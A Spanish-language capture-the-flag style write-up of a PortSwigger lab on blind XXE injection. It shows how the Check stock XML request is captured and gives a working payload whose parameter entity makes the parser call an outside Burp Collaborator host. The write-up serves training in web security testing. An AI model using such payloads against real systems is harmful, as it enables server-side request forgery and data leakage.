---
title: XXE Injection Lab 4
date: 2024-11-27 12:26:00 +0800
author: Justice-Reaper
categories:
  - Portswigger
  - XXE Injection
tags:
  - XXE
  - Injection
  - Exploiting
  - XXE
  - to
  - perform
  - SSRF
  - attacks
image:
  path: /assets/img/XXE-Injection-Lab-2/Portswigger.png
---

## Skills

- Blind XXE with out-of-band interaction via XML parameter entities

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este laboratorio tiene una función de `Check stock` que analiza la entrada XML, pero `no muestra valores inesperados` y `bloquea` las `solicitudes` que contienen `entidades externas regulares`. Para resolver el laboratorio, utiliza una `entidad` de `parámetro` para que el `analizador XML` realice una `búsqueda DNS` y una `solicitud HTTP` a `Burp Collaborator`

---
## Web Enumeration

Al `acceder` a la `web` nos sale esto

![[image_1.png]]

Si pulsamos en `View details` veremos la `descripción` del `artículo`

![[image_2.png]]

Si pulsamos en `Check stock` y `capturamos` la `petición` con `Burpsuite` vemos que se está tramitando un `XML`

![[image_3.png]]

Vamos a insertar un `DTD (Document Type Definition)` y a `comprobar` si es `vulnerable` a `XXE`

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY xxe "Doe"> ]>
	<stockCheck>
		<productId>
			&xxe;
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

La `respuesta` que obtenemos a `mandar` el `payload` es la siguiente

![[image_4.png]]

Nos vamos a `Burpsuite Collaborator` y pulsamos en `Copy to clipboard`, este dominio obtenido lo vamos a usar para construir este `payload`, el `%` sirve para `llamar` a la `entidad` desde el `DTD` creado

```
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://lqfvrsm0rxqxty3gudtykjjoifo6cx0m.oastify.com"> %xxe; ]>
	<stockCheck>
		<productId>
			1
		</productId>
		<storeId>
			1
		</storeId>
	</stockCheck>
```

Nos vamos a `Burpsuite Collaborator` y observamos que hemos `obtenido respuesta`

![[image_5.png]]

